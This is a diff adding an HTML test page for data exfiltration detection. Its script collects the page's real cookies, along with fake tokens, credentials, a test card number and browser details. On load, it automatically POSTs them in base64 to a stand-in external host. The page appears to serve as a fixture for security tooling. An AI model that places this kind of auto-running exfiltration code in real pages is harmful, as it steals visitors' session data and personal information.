@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Exfiltration Test</title>
+</head>
+<body>
+    <h1>Data Exfiltration Detection Test</h1>
+    <p>This page simulates data exfiltration by sending large payloads to external domains.</p>
+    <button id="trigger-exfil">Trigger Exfiltration</button>
+    <div id="status">Ready. Click button to trigger.</div>
+    <div id="details"></div>
+
+    <script>
+        const exfilDomain = 'data-collector.malicious-site.com';
+        const button = document.getElementById('trigger-exfil');
+        const status = document.getElementById('status');
+        const details = document.getElementById('details');
+
+        button.addEventListener('click', () => {
+            status.textContent = 'Generating large payload...';
+
+            // Simulate collecting sensitive data
+            const sensitiveData = {
+                cookies: document.cookie || 'session=fake_session_token_12345',
+                localStorage: JSON.stringify({
+                    userToken: 'fake_user_token_67890',
+                    userData: { email: 'test@example.com', id: '12345' }
+                }),
+                formData: {
+                    username: 'testuser',
+                    password: 'testpass123',
+                    creditCard: '4111-1111-1111-1111'
+                },
+                browserInfo: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    plugins: Array.from(navigator.plugins || []).map(p => p.name)
+                }
+            };
+
+            // Create large payload (simulating bulk data exfiltration)
+            const largePayload = btoa(JSON.stringify(sensitiveData).repeat(100)); // ~50KB
+
+            details.innerHTML = `<p>Payload size: ${largePayload.length} bytes</p>`;
+            status.textContent = 'Sending large payload...';
+
+            // Attempt to exfiltrate data
+            fetch(`http://${exfilDomain}/collect`, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    data: largePayload,
+                    timestamp: new Date().toISOString(),
+                    source: window.location.href
+                })
+            })
+                .then(() => {
+                    status.textContent = 'Exfiltration attempt completed';
+                    details.innerHTML += '<p style="color: red;">Data sent to external domain</p>';
+                })
+                .catch((error) => {
+                    status.textContent = 'Exfiltration attempt failed';
+                    details.innerHTML += `<p>Error: ${error.message}</p>`;
+                });
+        });
+
+        // Auto-trigger on page load for automated testing
+        setTimeout(() => {
+            button.click();
+        }, 1000);
+    </script>
+</body>
+</html>
